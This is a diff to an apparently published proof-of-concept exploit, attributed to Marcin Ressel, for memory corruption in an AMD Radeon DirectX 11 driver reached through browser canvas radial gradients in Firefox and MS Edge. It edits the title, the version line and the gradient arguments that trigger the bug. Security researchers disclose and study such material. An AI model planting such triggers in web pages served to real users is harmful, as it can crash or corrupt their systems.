@@ -3,12 +3,12 @@
 
 <script>
 /*
-Title : Advanced Micro Devices, Inc. Radeon DirectX 11 Driver (Firefox/MS Edge) Heap Corruption
+Title : Advanced Micro Devices, Inc. Radeon DirectX 11 Driver (Firefox/MS Edge) Memory Corruption
 Date : 10.04.2020 
 Exploit Author : Marcin Ressel
 Vendor Homepage : https://www.amd.com/
 Software Link: n/a
-Version: 8.17.10.0871
+Version: 8.17.10.0871 (atidxx64.dll)
 Tested on: Windows 10 home, AMD64 Family 23 Model 24 Stepping 1 AuthenticAMD ~2100 Mhz,
            Firefox 74.0 (64 bity)
 		   MS Edge 
@@ -68,7 +68,7 @@ document.body.appendChild(canvas);
 var context = canvas.getContext("2d")
 
 function radioActiveGradient() {
-        var ret =  context.createRadialGradient(1 * 2,1,0,1*2,0.6898449305444956 * 2,1);
+        var ret =  context.createRadialGradient(1,1,0,1,0.6898449305444956,1);
 		ret.addColorStop(0,"rgb(1,1,1)");
         return ret;		
 }
